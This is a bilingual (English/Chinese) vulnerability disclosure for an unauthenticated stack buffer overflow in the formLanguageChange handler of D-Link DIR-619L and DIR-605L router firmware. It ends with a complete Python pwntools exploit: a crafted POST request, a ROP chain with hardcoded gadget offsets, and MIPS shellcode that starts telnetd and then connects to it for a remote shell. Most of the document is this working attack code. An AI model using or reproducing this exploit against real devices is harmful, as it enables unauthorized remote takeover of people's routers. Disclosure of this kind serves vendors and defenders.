``` 
Dlink model DIR-619L, the latest firmware 2.06B1, There is a stack overflow vulnerability that does not require authentication
This can cause remote code execution
download link: ftp://ftp2.dlink.com/PRODUCTS/DIR-619L/REVB/
Vulnerability location: file:  /bin/boa  function: formLanguageChange
The attacker calls this function by sending a post packet to the http://ip/goform/formLanguageChange page.
Post parameter currTime length is not verified。After using sprintf directly，Caused a stack overflow。
The same problem exists with the latest firmware 2.12B1 on the DIR-605L.
download link:ftp://ftp2.dlink.com/SECURITY_ADVISEMENTS/DIR-605L/REVB/
``` 
post package

![image](https://github.com/WhooAmii/whooamii.github.io/blob/master/2018/5.png)

![image](https://github.com/WhooAmii/whooamii.github.io/blob/master/2018/6.png)

Dlink型号DIR-619L最新固件2.06B1上存在不需要验证身份的栈缓冲区溢出漏洞。
可造成远程任意代码执行。
下载地址：ftp://ftp2.dlink.com/PRODUCTS/DIR-619L/REVB/
漏洞位置发生在/bin/boa程序的formLanguageChange函数。
攻击者通过向http://ip/goform/formLangageChange页面发送post包调用此函数。
Post参数currTime长度未经校验使用sprintf写入栈上。并在之后websRedirect页面跳转函数中通过jr ra。控制代码流程。
 

将shell code存放在栈上
通过rop跳转执行sleep函数后跳转至shellcode。执行telnetd程序完成利用。
型号DIR-605L最新固件2.12B1上同样存在该问题。
下载地址ftp://ftp2.dlink.com/SECURITY_ADVISEMENTS/DIR-605L/REVB/
 

DIR-619l.py
``` python
import requests
import sys
import struct
from pwn import *
def inter():
	p=remote('192.168.0.1',23)
	p.interactive()
def syscmd1(a):
	p=remote('192.168.0.1',80)
	z=len(a)
	payload=''
	payload+='POST /goform/formLanguageChange HTTP/1.1\r\n'
	payload+='Host: 192.168.0.1\r\n'
	payload+='Connection: keep-alive\r\n'
	payload+='Accept-Encoding: gzip, deflate\r\n'
	payload+='Accept: */*\r\n'
	payload+='User-Agent: python-requests/2.18.4\r\n'
	payload+='Content-Length: '+str(z+9)+'\r\n'
	payload+='Content-Type: application/x-www-form-urlencoded\r\n'
	payload+='\r\n'
	payload+='currTime='
	payload+=a
	p.send(payload)
	p.recvuntil('</html>')
	p.close()

base1=0x2aba9500-0x22500
###shellcode
shellcode =''
shellcode += struct.pack(">I",0x24060666)
shellcode += struct.pack(">I",0x04d0ffff)
shellcode += struct.pack(">I",0x2806ffff)
shellcode += struct.pack(">I",0x27bdffe0)
shellcode += struct.pack(">I",0x27e41005)
shellcode += struct.pack(">I",0x2484f01f)
shellcode += struct.pack(">I",0xafa4ffe8)
shellcode += struct.pack(">I",0xafa0ffec)
shellcode += struct.pack(">I",0x27a5ffe8)
shellcode += struct.pack(">I",0x24020fab)
shellcode += struct.pack(">I",0x0101010c)
shellcode += 'aaaa'+'/usr/bin/telnetd'+chr(0)
s0=struct.pack(">I",base1+0x2C794)
s1=struct.pack(">I",base1+0x2C794) ### rop2
s2=struct.pack(">I",base1+0x24b70)
s3=struct.pack(">I",base1+0x2bdac)###rop3
s4=struct.pack(">I",base1+0x2bdac)
###rop
payload1='a'*0x167+s0+s1+s2+s3
payload1+=struct.pack(">I",base1+0x25714)  ###rop1
payload1+='a'*0x1c+s0+s1+s2+s3+s4
payload1+=struct.pack(">I",base1+0x24d70)  ###sleep
payload1+='a'*0x14
payload1+=struct.pack(">I",0x24910101)
payload1+=struct.pack(">I",0x2231feff)
payload1+=struct.pack(">I",0x0220c821)
payload1+=struct.pack(">I",0x0320f809)
payload1+=struct.pack(">I",0x2231feff)
payload1+=struct.pack(">I",0x2231feff)
payload1+=struct.pack(">I",base1+0x2bda0) ###rop4
payload1+='a'*0x20+shellcode
if __name__ == "__main__":
	syscmd1(payload1)	
	inter()
``` 
